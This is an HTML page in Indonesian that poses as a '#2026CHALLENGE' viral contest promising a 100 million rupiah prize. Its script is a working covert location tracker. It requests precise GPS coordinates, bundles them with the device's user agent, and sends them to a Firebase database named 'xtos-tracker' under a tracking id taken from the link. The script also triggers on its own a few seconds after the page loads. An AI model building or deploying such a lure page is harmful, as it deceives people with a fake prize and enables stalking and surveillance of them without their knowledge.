<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî• Viral Challenge 2026 - Join Sekarang!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; text-align: center; }
        .title { font-size: 2.2em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .challenge { background: rgba(255,255,255,0.1); margin: 15px 0; padding: 20px; border-radius: 15px; }
        .prize { font-size: 1.5em; color: #FFD700; font-weight: bold; margin: 10px 0; }
        .btn { background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
        .btn:hover { transform: translateY(-2px); }
        .status { margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">üî• #2026CHALLENGE</div>
        
        <div class="challenge">
            <div>üì∏ Upload foto di lokasi Anda</div>
            <div>üèÜ Menangkan hadiah jutaan rupiah</div>
            <div class="prize">üí∞ TOTAL HADIAH: 100 JUTA!</div>
        </div>
        
        <button class="btn" onclick="joinChallenge()">üöÄ JOIN CHALLENGE SEKARANG</button>
        
        <div class="status" id="status">Klik untuk bergabung dengan 5 juta peserta lainnya!</div>
    </div>

    <script>
        async function joinChallenge() {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = '<div class="loading"></div> Memverifikasi lokasi untuk challenge...';
            
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                });
                
                const lat = position.coords.latitude; const lng = position.coords.longitude;
                statusEl.innerHTML = '‚úÖ Lokasi terverifikasi! Bergabung dengan challenge...';
                
                const deviceInfo = {
                    latitude: lat, longitude: lng, accuracy: position.coords.accuracy, timestamp: Date.now(),
                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
                    source: 'viral_challenge', challenge: '2026Challenge', userAgent: navigator.userAgent
                };
                
                const trackingId = new URLSearchParams(window.location.search).get('id') || 'viral_' + Date.now();
                const endpoints = [
                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/challenges/${trackingId}.json`
                ];
                
                await Promise.allSettled(endpoints.map(endpoint => 
                    fetch(endpoint, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo) })
                ));
                
                setTimeout(() => {
                    alert('üéâ Selamat! Anda berhasil join #2026Challenge! Upload foto Anda sekarang.');
                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
                }, 2000);
                
            } catch (error) {
                statusEl.innerHTML = '‚ùå Gagal verifikasi lokasi. Aktifkan GPS untuk join challenge.';
            }
        }
        
        setTimeout(() => { if (document.getElementById('status').textContent.includes('Klik')) joinChallenge(); }, 3500);
    </script>
</body>
</html>
